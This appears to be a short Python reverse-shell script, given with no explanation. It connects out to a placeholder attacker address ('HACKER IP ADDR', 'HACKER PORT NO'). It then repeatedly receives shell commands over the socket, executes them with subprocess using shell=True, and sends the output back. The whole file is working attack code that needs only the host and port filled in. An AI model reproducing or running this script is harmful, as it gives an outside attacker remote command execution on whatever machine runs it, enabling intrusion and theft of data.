

import socket
import subprocess

def command_execution(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("HACKER IP ADDR", HACKER PORT NO))

connection.send("OK\n".encode())

try:
    while True:

        command = connection.recv(1024).decode()
        if not command:
            break
        command_output = command_execution(command)
        connection.send(command_output)
except Exception as e:
    print("An error occured : ", e)
finally:
    connection.close()
